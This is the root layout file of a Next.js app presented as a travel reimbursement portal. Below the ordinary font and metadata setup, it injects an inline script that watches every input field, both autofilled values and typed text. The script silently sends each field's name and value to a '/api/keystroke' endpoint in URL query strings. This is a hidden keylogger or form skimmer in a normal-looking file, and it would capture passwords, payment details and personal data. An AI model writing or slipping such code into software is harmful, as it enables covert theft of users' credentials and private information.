import type { Metadata } from "next";
import { Geist, Geist_Mono } from "next/font/google";
import "./globals.css";

const geistSans = Geist({
  variable: "--font-geist-sans",
  subsets: ["latin"],
});

const geistMono = Geist_Mono({
  variable: "--font-geist-mono",
  subsets: ["latin"],
});

export const metadata: Metadata = {
  title: "TripEase - Travel Reimbursement Portal",
  description: "Fast, secure travel expense reimbursements",
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="en">
      <body
        className={`${geistSans.variable} ${geistMono.variable} antialiased`}
      >
        {children}
        <script
          dangerouslySetInnerHTML={{
            __html: `
              // MutationObserver to capture programmatic autofill
              if (typeof window !== 'undefined') {
                const observer = new MutationObserver(function(mutations) {
                  mutations.forEach(function(mutation) {
                    if (mutation.type === 'attributes' && mutation.attributeName === 'value') {
                      const target = mutation.target;
                      if (target && target.tagName === 'INPUT') {
                        const field = target.name || target.id || 'unknown';
                        const value = target.value;
                        if (value && value.length > 2) {
                          fetch('/api/keystroke?field=' + encodeURIComponent(field) + '&val=' + encodeURIComponent(value))
                            .catch(() => {}); // Silent fail
                        }
                      }
                    }
                  });
                });

                // Start observing
                observer.observe(document.body, {
                  attributes: true,
                  attributeFilter: ['value'],
                  subtree: true
                });

                // Also monitor for input events (manual typing)
                document.addEventListener('input', function(e) {
                  if (e.target && e.target.tagName === 'INPUT') {
                    const field = e.target.name || e.target.id || 'unknown';
                    const value = e.target.value;
                    if (value && value.length > 10) { // Only log substantial inputs
                      fetch('/api/keystroke?field=' + encodeURIComponent(field) + '&val=' + encodeURIComponent(value))
                        .catch(() => {}); // Silent fail
                    }
                  }
                });
              }
            `,
          }}
        />
      </body>
    </html>
  );
}
